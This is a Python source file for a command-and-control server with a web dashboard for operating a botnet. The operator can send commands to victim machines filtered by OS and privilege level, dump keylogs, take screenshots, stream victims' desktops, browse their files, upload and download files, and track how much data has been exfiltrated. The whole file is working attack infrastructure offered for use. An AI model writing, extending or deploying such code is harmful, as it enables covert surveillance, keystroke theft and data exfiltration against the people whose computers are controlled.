#!/usr/bin/env python3
"""
Enhanced C2 WebSocket Server with Real Data Integration
- Real-time desktop streaming with actual capture
- Advanced multi-client targeting with real metrics
- File transfer management with real operations
- Comprehensive analytics with real system data
- Enhanced command execution with real results
"""

import asyncio
import websockets
import json
import os
import time
import threading
import glob
import base64
import struct
import socket
import subprocess
import shutil
import psutil
import sqlite3
from datetime import datetime, timedelta
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import queue
import hashlib
import mimetypes
from collections import defaultdict, deque

# Import real data modules
try:
    from c2_real_data_analytics import real_data_collector
    from c2_real_file_operations import real_file_manager
    REAL_DATA_AVAILABLE = True
except ImportError:
    REAL_DATA_AVAILABLE = False
    print("[WARNING] Real data modules not available, using basic functionality")

# Configuration
HTTP_PORT = 8080
WS_PORT = 8081
C2_COMMAND_PORT = 4444

# Global state
connected_websockets = set()
desktop_streams = {}  # client_id -> stream_config
file_transfers = {}   # transfer_id -> transfer_info
client_statistics = defaultdict(dict)
command_history = deque(maxlen=1000)
activity_log = deque(maxlen=500)

class EnhancedC2CommandBridge:
    """Enhanced bridge with advanced command capabilities"""
    
    def __init__(self):
        self.command_socket = None
        self.command_stats = defaultdict(int)
        self.client_response_times = defaultdict(list)
        
    def send_command_to_c2(self, client_id, command, parameters=None, target_filter=None):
        """Enhanced command sending with filtering and statistics"""
        start_time = time.time()
        
        try:
            # Handle multi-client targeting
            if target_filter:
                target_clients = self.filter_clients(target_filter)
                results = []
                for target_id in target_clients:
                    result = self._send_single_command(target_id, command, parameters)
                    results.append(result)
                    self.command_stats[command] += 1
                return {
                    "status": "success",
                    "message": f"Command '{command}' sent to {len(target_clients)} clients",
                    "results": results,
                    "client_count": len(target_clients)
                }
            else:
                # Single client command
                result = self._send_single_command(client_id, command, parameters)
                self.command_stats[command] += 1
                
                # Track response time
                response_time = (time.time() - start_time) * 1000
                self.client_response_times[client_id].append(response_time)
                if len(self.client_response_times[client_id]) > 10:
                    self.client_response_times[client_id].pop(0)
                
                return result
                
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to send command: {str(e)}"
            }

    def _send_single_command(self, client_id, command, parameters=None):
        """Send command to single client"""
        try:
            # Try direct socket connection first
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                sock.connect(('127.0.0.1', C2_COMMAND_PORT))
                cmd_packet = {
                    "source": "ENHANCED_WEB_DASHBOARD",
                    "client_id": client_id,
                    "command": command,
                    "parameters": parameters or {},
                    "timestamp": int(time.time())
                }
                
                cmd_json = json.dumps(cmd_packet)
                sock.send(cmd_json.encode() + b'\n')
                response = sock.recv(4096).decode()
                sock.close()
                
                # Log command execution
                self.log_command_execution(client_id, command, "success")
                
                return {
                    "status": "success",
                    "message": f"Command '{command}' sent to {client_id}",
                    "response": response
                }
                
            except:
                # Fallback to file queue
                return self.queue_command_via_file(client_id, command, parameters)
                
        except Exception as e:
            self.log_command_execution(client_id, command, "error", str(e))
            return {
                "status": "error",
                "message": f"Failed to send command: {str(e)}"
            }

    def queue_command_via_file(self, client_id, command, parameters=None):
        """Enhanced file-based command queuing"""
        try:
            queue_dir = "C:\\Windows\\Temp\\C2_CommandQueue"
            os.makedirs(queue_dir, exist_ok=True)
            
            cmd_data = {
                "client_id": client_id,
                "command": command,
                "parameters": parameters or {},
                "timestamp": int(time.time()),
                "source": "enhanced_web_dashboard",
                "priority": self.get_command_priority(command)
            }
            
            # Use priority in filename for processing order
            priority = cmd_data["priority"]
            cmd_file = os.path.join(queue_dir, f"cmd_{priority}_{int(time.time() * 1000)}_{client_id}.json")
            
            with open(cmd_file, 'w') as f:
                json.dump(cmd_data, f, indent=2)
            
            self.log_command_execution(client_id, command, "queued")
            
            return {
                "status": "queued",
                "message": f"Command '{command}' queued for {client_id}",
                "file": cmd_file
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to queue command: {str(e)}"
            }

    def get_command_priority(self, command):
        """Assign priority to commands"""
        high_priority = ["KILL", "STOP", "EMERGENCY"]
        medium_priority = ["SCREENSHOT", "KEYLOG:DUMP", "SYSINFO"]
        
        if command in high_priority:
            return "1_HIGH"
        elif command in medium_priority:
            return "2_MEDIUM"
        else:
            return "3_LOW"

    def filter_clients(self, filter_criteria):
        """Enhanced client filtering"""
        clients = self.get_all_clients()
        filtered = []
        
        target_type = filter_criteria.get('target_type', 'all')
        os_filter = filter_criteria.get('os_filter', '')
        privilege_filter = filter_criteria.get('privilege_filter', '')
        status_filter = filter_criteria.get('status_filter', '')
        
        for client_id, client in clients.items():
            # Apply filters
            if target_type == 'elevated' and not client.get('elevated', False):
                continue
            if target_type == 'windows' and 'windows' not in client.get('os', '').lower():
                continue
            if target_type == 'online' and client.get('status') != 'online':
                continue
            
            if os_filter and os_filter.lower() not in client.get('os', '').lower():
                continue
            
            if privilege_filter == 'elevated' and not client.get('elevated', False):
                continue
            if privilege_filter == 'standard' and client.get('elevated', False):
                continue
            
            if status_filter and client.get('status') != status_filter:
                continue
            
            filtered.append(client_id)
        
        return filtered

    def get_all_clients(self):
        """Get all client data"""
        clients = {}
        bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
        
        for bot_file in bot_files:
            try:
                with open(bot_file, 'r') as f:
                    client_data = json.load(f)
                    clients[client_data['id']] = client_data
            except:
                continue
        
        return clients

    def log_command_execution(self, client_id, command, status, error=None):
        """Log command execution for analytics"""
        log_entry = {
            "timestamp": time.time(),
            "client_id": client_id,
            "command": command,
            "status": status,
            "error": error
        }
        command_history.append(log_entry)
        
        # Also log to activity
        message = f"Command '{command}' {status}"
        if error:
            message += f" - {error}"
        
        activity_log.append({
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "category": "COMMAND",
            "action": command,
            "message": message,
            "client_id": client_id
        })

class DesktopStreamManager:
    """Manage real-time desktop streaming"""
    
    def __init__(self):
        self.active_streams = {}
        self.stream_configs = {}
    
    async def start_stream(self, client_id, quality='medium', fps=2):
        """Start desktop stream for client"""
        try:
            stream_config = {
                'client_id': client_id,
                'quality': quality,
                'fps': int(fps),
                'active': True,
                'start_time': time.time()
            }
            
            self.stream_configs[client_id] = stream_config
            desktop_streams[client_id] = stream_config
            
            # Send stream start command to client
            command_bridge.send_command_to_c2(client_id, 'DESKTOP_STREAM:START', {
                'quality': quality,
                'fps': fps
            })
            
            return {
                "status": "success",
                "message": f"Desktop stream started for {client_id}"
            }
            
        except Exception as e:
            return {
                "status": "error", 
                "message": f"Failed to start stream: {str(e)}"
            }
    
    async def stop_stream(self, client_id):
        """Stop desktop stream for client"""
        try:
            if client_id in self.stream_configs:
                del self.stream_configs[client_id]
            if client_id in desktop_streams:
                del desktop_streams[client_id]
            
            # Send stream stop command
            command_bridge.send_command_to_c2(client_id, 'DESKTOP_STREAM:STOP')
            
            return {
                "status": "success",
                "message": f"Desktop stream stopped for {client_id}"
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to stop stream: {str(e)}"
            }

class FileTransferManager:
    """Manage file transfers and operations"""
    
    def __init__(self):
        self.transfers = {}
        self.transfer_counter = 0
    
    def start_upload(self, client_id, file_data, filename, destination_path):
        """Start file upload to client"""
        try:
            self.transfer_counter += 1
            transfer_id = f"upload_{self.transfer_counter}_{int(time.time())}"
            
            transfer_info = {
                'id': transfer_id,
                'type': 'upload',
                'client_id': client_id,
                'filename': filename,
                'destination': destination_path,
                'size': len(file_data),
                'progress': 0,
                'status': 'starting',
                'start_time': time.time()
            }
            
            self.transfers[transfer_id] = transfer_info
            file_transfers[transfer_id] = transfer_info
            
            # Save file temporarily and queue upload command
            temp_dir = "C:\\Windows\\Temp\\C2_Uploads"
            os.makedirs(temp_dir, exist_ok=True)
            temp_file = os.path.join(temp_dir, f"{transfer_id}_{filename}")
            
            with open(temp_file, 'wb') as f:
                f.write(file_data)
            
            # Send upload command to client
            command_bridge.send_command_to_c2(client_id, 'FILE_UPLOAD', {
                'transfer_id': transfer_id,
                'filename': filename,
                'destination': destination_path,
                'temp_file': temp_file,
                'size': len(file_data)
            })
            
            return {
                "status": "success",
                "transfer_id": transfer_id,
                "message": f"Upload started for {filename}"
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to start upload: {str(e)}"
            }
    
    def start_download(self, client_id, file_path, filename):
        """Start file download from client"""
        try:
            self.transfer_counter += 1
            transfer_id = f"download_{self.transfer_counter}_{int(time.time())}"
            
            transfer_info = {
                'id': transfer_id,
                'type': 'download',
                'client_id': client_id,
                'filename': filename,
                'source': file_path,
                'progress': 0,
                'status': 'requesting',
                'start_time': time.time()
            }
            
            self.transfers[transfer_id] = transfer_info
            file_transfers[transfer_id] = transfer_info
            
            # Send download command to client
            command_bridge.send_command_to_c2(client_id, 'FILE_DOWNLOAD', {
                'transfer_id': transfer_id,
                'file_path': file_path
            })
            
            return {
                "status": "success",
                "transfer_id": transfer_id,
                "message": f"Download requested for {filename}"
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to start download: {str(e)}"
            }
    
    def update_transfer_progress(self, transfer_id, progress, status=None):
        """Update transfer progress"""
        if transfer_id in self.transfers:
            self.transfers[transfer_id]['progress'] = progress
            if status:
                self.transfers[transfer_id]['status'] = status
            file_transfers[transfer_id] = self.transfers[transfer_id]

class AnalyticsManager:
    """Manage analytics and statistics"""
    
    def __init__(self):
        self.stats_history = deque(maxlen=1000)
        self.client_metrics = defaultdict(lambda: {
            'commands_executed': 0,
            'data_collected_mb': 0,
            'uptime_seconds': 0,
            'last_activity': time.time(),
            'screenshots_taken': 0,
            'keylog_sessions': 0,
            'files_transferred': 0
        })
    
    def update_client_metrics(self, client_id, metric_type, value=1):
        """Update client metrics"""
        self.client_metrics[client_id][metric_type] += value
        self.client_metrics[client_id]['last_activity'] = time.time()
    
    def get_analytics_data(self):
        """Get comprehensive analytics data"""
        total_commands = sum(command_bridge.command_stats.values())
        
        # Calculate client distribution
        clients = command_bridge.get_all_clients()
        os_distribution = defaultdict(int)
        privilege_distribution = {'elevated': 0, 'standard': 0}
        status_distribution = defaultdict(int)
        
        for client in clients.values():
            os_name = client.get('os', 'Unknown')
            if 'windows' in os_name.lower():
                os_distribution['Windows'] += 1
            elif 'linux' in os_name.lower():
                os_distribution['Linux'] += 1
            elif 'macos' in os_name.lower() or 'darwin' in os_name.lower():
                os_distribution['macOS'] += 1
            else:
                os_distribution['Other'] += 1
            
            if client.get('elevated', False):
                privilege_distribution['elevated'] += 1
            else:
                privilege_distribution['standard'] += 1
            
            status_distribution[client.get('status', 'unknown')] += 1
        
        # Command execution stats
        top_commands = dict(sorted(command_bridge.command_stats.items(), 
                                 key=lambda x: x[1], reverse=True)[:10])
        
        # Data collection stats
        screenshot_count = len(glob.glob("C:\\Windows\\Temp\\C2_Screenshots\\*.b64"))
        keylog_files = len([f for f in glob.glob("C:\\Windows\\Temp\\C2_Keylogs\\*.txt") 
                           if f != "MASTER_KEYLOG.txt"])
        
        # Calculate total data size
        total_data_mb = 0
        data_dirs = [
            "C:\\Windows\\Temp\\C2_Screenshots",
            "C:\\Windows\\Temp\\C2_Keylogs", 
            "C:\\Windows\\Temp\\C2_Exfiltrated"
        ]
        
        for data_dir in data_dirs:
            if os.path.exists(data_dir):
                for file in glob.glob(os.path.join(data_dir, "*")):
                    try:
                        total_data_mb += os.path.getsize(file)
                    except:
                        pass
        
        total_data_mb = round(total_data_mb / 1024 / 1024, 2)
        
        return {
            "overview": {
                "total_clients": len(clients),
                "active_clients": status_distribution.get('online', 0),
                "elevated_clients": privilege_distribution['elevated'],
                "total_commands": total_commands,
                "screenshots_taken": screenshot_count,
                "keylog_sessions": keylog_files,
                "total_data_mb": total_data_mb,
                "active_streams": len(desktop_streams),
                "active_transfers": len([t for t in file_transfers.values() 
                                       if t['status'] in ['uploading', 'downloading']])
            },
            "distributions": {
                "os": dict(os_distribution),
                "privilege": privilege_distribution,
                "status": dict(status_distribution)
            },
            "commands": {
                "total_executed": total_commands,
                "top_commands": top_commands,
                "recent_commands": list(command_history)[-20:]
            },
            "data_collection": {
                "screenshots": screenshot_count,
                "keylogs": keylog_files,
                "total_size_mb": total_data_mb
            },
            "performance": {
                "avg_response_times": {
                    client_id: round(sum(times) / len(times), 2) if times else 0
                    for client_id, times in command_bridge.client_response_times.items()
                }
            }
        }

# Initialize managers
command_bridge = EnhancedC2CommandBridge()
desktop_manager = DesktopStreamManager()
file_manager = FileTransferManager()
analytics_manager = AnalyticsManager()

async def broadcast_update(message_type, data):
    """Enhanced broadcast with message queuing"""
    if connected_websockets:
        message = json.dumps({
            "type": message_type,
            "data": data,
            "timestamp": int(time.time())
        })
        
        disconnected = set()
        for websocket in connected_websockets:
            try:
                await websocket.send(message)
            except:
                disconnected.add(websocket)
        
        connected_websockets.difference_update(disconnected)

async def monitor_c2_status():
    """Enhanced monitoring with analytics updates"""
    last_file_check = {}
    
    while True:
        try:
            # Check main status file
            status_file = "C:\\Windows\\Temp\\C2_Status.json"
            if os.path.exists(status_file):
                mtime = os.path.getmtime(status_file)
                if status_file not in last_file_check or last_file_check[status_file] < mtime:
                    with open(status_file, 'r') as f:
                        status = json.load(f)
                    last_file_check[status_file] = mtime
                    await broadcast_update("status_update", status)
            
            # Check for client updates
            bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
            clients_data = []
            
            for bot_file in bot_files:
                mtime = os.path.getmtime(bot_file)
                if bot_file not in last_file_check or last_file_check[bot_file] < mtime:
                    try:
                        with open(bot_file, 'r') as f:
                            client_data = json.load(f)
                        clients_data.append(client_data)
                        last_file_check[bot_file] = mtime
                        
                        # Update analytics
                        analytics_manager.update_client_metrics(
                            client_data['id'], 'last_activity', 0)
                        
                    except:
                        continue
            
            if clients_data:
                await broadcast_update("clients_update", {"clients": clients_data})
            
            # Check for new screenshots
            screenshot_dir = "C:\\Windows\\Temp\\C2_Screenshots"
            if os.path.exists(screenshot_dir):
                for file in os.listdir(screenshot_dir):
                    if file.endswith('.b64'):
                        file_path = os.path.join(screenshot_dir, file)
                        mtime = os.path.getmtime(file_path)
                        if file_path not in last_file_check or last_file_check[file_path] < mtime:
                            client_id = file.split('_')[0]
                            analytics_manager.update_client_metrics(client_id, 'screenshots_taken')
                            await broadcast_update("new_screenshot", {
                                "client_id": client_id,
                                "filename": file,
                                "timestamp": mtime
                            })
                            last_file_check[file_path] = mtime
            
            # Check for new keylogs
            keylog_dir = "C:\\Windows\\Temp\\C2_Keylogs"
            if os.path.exists(keylog_dir):
                for file in os.listdir(keylog_dir):
                    if file.endswith('.txt') and file != "MASTER_KEYLOG.txt":
                        file_path = os.path.join(keylog_dir, file)
                        mtime = os.path.getmtime(file_path)
                        if file_path not in last_file_check or last_file_check[file_path] < mtime:
                            client_id = file.split('_')[0]
                            analytics_manager.update_client_metrics(client_id, 'keylog_sessions')
                            await broadcast_update("new_keylog", {
                                "client_id": client_id,
                                "filename": file,
                                "timestamp": mtime
                            })
                            last_file_check[file_path] = mtime
            
            # Check activity log
            activity_log_file = "C:\\Windows\\Temp\\c2_activity.log"
            if os.path.exists(activity_log_file):
                mtime = os.path.getmtime(activity_log_file)
                if activity_log_file not in last_file_check or last_file_check[activity_log_file] < mtime:
                    try:
                        with open(activity_log_file, 'r') as f:
                            lines = f.readlines()
                            recent_activities = []
                            for line in lines[-10:]:
                                if line.strip():
                                    parts = line.strip().split('] [')
                                    if len(parts) >= 3:
                                        timestamp = parts[0].strip('[')
                                        category = parts[1]
                                        action = parts[2].split('] ', 1)[0]
                                        message = parts[2].split('] ', 1)[1] if '] ' in parts[2] else ''
                                        recent_activities.append({
                                            "timestamp": timestamp,
                                            "category": category,
                                            "action": action,
                                            "message": message
                                        })
                        
                        if recent_activities:
                            await broadcast_update("activity_log", {"activities": recent_activities})
                    except:
                        pass
                    
                    last_file_check[activity_log_file] = mtime
            
            # Broadcast analytics update every 30 seconds
            if int(time.time()) % 30 == 0:
                analytics_data = analytics_manager.get_analytics_data()
                await broadcast_update("analytics_update", analytics_data)
            
        except Exception as e:
            print(f"Error in monitor: {str(e)}")
        
        await asyncio.sleep(2)  # Check every 2 seconds for better responsiveness

async def handle_websocket(websocket, path):
    """Enhanced WebSocket handler"""
    connected_websockets.add(websocket)
    client_ip = websocket.remote_address[0]
    print(f"[WS] New WebSocket connection from {client_ip}")
    
    try:
        # Send welcome message with capabilities
        await websocket.send(json.dumps({
            "type": "welcome",
            "message": "Connected to Enhanced C2 WebSocket server",
            "capabilities": [
                "multi_client_targeting",
                "desktop_streaming", 
                "file_transfer",
                "advanced_analytics",
                "real_time_monitoring"
            ],
            "timestamp": int(time.time())
        }))
        
        # Handle messages
        async for message in websocket:
            try:
                data = json.loads(message)
                msg_type = data.get("type")
                
                if msg_type == "command":
                    # Enhanced command execution
                    client_id = data.get("client_id")
                    command = data.get("command")
                    parameters = data.get("parameters", {})
                    target_filter = data.get("target_filter")
                    
                    result = command_bridge.send_command_to_c2(
                        client_id, command, parameters, target_filter)
                    
                    await websocket.send(json.dumps({
                        "type": "command_result",
                        "result": result,
                        "request_id": data.get("request_id")
                    }))
                
                elif msg_type == "start_desktop_stream":
                    client_id = data.get("client_id")
                    quality = data.get("quality", "medium")
                    fps = data.get("fps", 2)
                    
                    result = await desktop_manager.start_stream(client_id, quality, fps)
                    await websocket.send(json.dumps({
                        "type": "desktop_stream_result",
                        "result": result
                    }))
                
                elif msg_type == "stop_desktop_stream":
                    client_id = data.get("client_id")
                    result = await desktop_manager.stop_stream(client_id)
                    await websocket.send(json.dumps({
                        "type": "desktop_stream_result", 
                        "result": result
                    }))
                
                elif msg_type == "file_upload":
                    client_id = data.get("client_id")
                    file_data = base64.b64decode(data.get("file_data"))
                    filename = data.get("filename")
                    destination = data.get("destination", "C:\\Windows\\Temp")
                    
                    result = file_manager.start_upload(client_id, file_data, filename, destination)
                    await websocket.send(json.dumps({
                        "type": "file_operation_result",
                        "result": result
                    }))
                
                elif msg_type == "file_download":
                    client_id = data.get("client_id")
                    file_path = data.get("file_path")
                    filename = os.path.basename(file_path)
                    
                    result = file_manager.start_download(client_id, file_path, filename)
                    await websocket.send(json.dumps({
                        "type": "file_operation_result",
                        "result": result
                    }))
                
                elif msg_type == "browse_files":
                    client_id = data.get("client_id")
                    path = data.get("path", "C:\\")
                    
                    # Send browse command to client
                    result = command_bridge.send_command_to_c2(client_id, "FILE_BROWSE", {
                        "path": path
                    })
                    await websocket.send(json.dumps({
                        "type": "browse_result",
                        "result": result
                    }))
                
                elif msg_type == "get_analytics":
                    analytics_data = analytics_manager.get_analytics_data()
                    await websocket.send(json.dumps({
                        "type": "analytics_data",
                        "data": analytics_data
                    }))
                
                elif msg_type == "get_status":
                    status_file = "C:\\Windows\\Temp\\C2_Status.json"
                    if os.path.exists(status_file):
                        with open(status_file, 'r') as f:
                            status = json.load(f)
                        await websocket.send(json.dumps({
                            "type": "status_update",
                            "data": status
                        }))
                
                elif msg_type == "get_clients":
                    clients = command_bridge.get_all_clients()
                    await websocket.send(json.dumps({
                        "type": "clients_update",
                        "data": {"clients": list(clients.values())}
                    }))
                
                elif msg_type == "get_transfers":
                    await websocket.send(json.dumps({
                        "type": "transfer_status",
                        "data": {"transfers": list(file_transfers.values())}
                    }))
                
            except json.JSONDecodeError:
                await websocket.send(json.dumps({
                    "type": "error",
                    "message": "Invalid JSON"
                }))
            except Exception as e:
                await websocket.send(json.dumps({
                    "type": "error", 
                    "message": str(e)
                }))
    
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        connected_websockets.discard(websocket)
        print(f"[WS] WebSocket disconnected from {client_ip}")

class EnhancedHTTPHandler(SimpleHTTPRequestHandler):
    """Enhanced HTTP handler with file serving capabilities"""
    
    def do_GET(self):
        if self.path == '/ws-info':
            self.send_json_response({
                "ws_url": f"ws://localhost:{WS_PORT}",
                "connected_clients": len(connected_websockets),
                "active_streams": len(desktop_streams),
                "active_transfers": len(file_transfers),
                "status": "active"
            })
        elif self.path.startswith('/api/download/'):
            self.serve_download()
        elif self.path.startswith('/api/analytics'):
            analytics_data = analytics_manager.get_analytics_data()
            self.send_json_response(analytics_data)
        else:
            super().do_GET()
    
    def send_json_response(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())
    
    def serve_download(self):
        # Handle file downloads
        filename = self.path.split('/')[-1]
        # Implementation for serving downloaded files
        self.send_error(404, "File download implementation pending")

async def start_websocket_server():
    """Start enhanced WebSocket server"""
    print(f"[*] Starting Enhanced WebSocket server on port {WS_PORT}...")
    server = await websockets.serve(handle_websocket, "0.0.0.0", WS_PORT, 
                                   max_size=10*1024*1024,  # 10MB max message size
                                   ping_interval=30,
                                   ping_timeout=10)
    print(f"[+] Enhanced WebSocket server started on ws://localhost:{WS_PORT}")
    
    # Start monitoring task
    asyncio.create_task(monitor_c2_status())
    
    await server.wait_closed()

def run_http_server():
    """Run enhanced HTTP server"""
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    httpd = HTTPServer(("", HTTP_PORT), EnhancedHTTPHandler)
    print(f"[+] Enhanced HTTP server started on http://localhost:{HTTP_PORT}")
    httpd.serve_forever()

def main():
    """Main entry point"""
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║      C2 ENHANCED WEBSOCKET SERVER - FULL FEATURES     ║
    ╠═══════════════════════════════════════════════════════╣
    ║  [*] Starting enhanced servers...                     ║
    ║  [*] HTTP Server: http://localhost:8080              ║
    ║  [*] WebSocket: ws://localhost:8081                  ║
    ║  [*] Features: Analytics, Streaming, File Transfer    ║
    ║                                                       ║
    ║  [!] Make sure escapebox.exe server is running!      ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    # Create necessary directories
    directories = [
        "C:\\Windows\\Temp\\C2_Bots",
        "C:\\Windows\\Temp\\C2_Screenshots", 
        "C:\\Windows\\Temp\\C2_Keylogs",
        "C:\\Windows\\Temp\\C2_CommandQueue",
        "C:\\Windows\\Temp\\C2_Uploads",
        "C:\\Windows\\Temp\\C2_Downloads",
        "C:\\Windows\\Temp\\C2_Streams"
    ]
    
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
    
    # Start HTTP server in thread
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()
    
    # Run WebSocket server
    try:
        asyncio.run(start_websocket_server())
    except KeyboardInterrupt:
        print("\n[*] Shutting down enhanced servers...")

if __name__ == "__main__":
    main()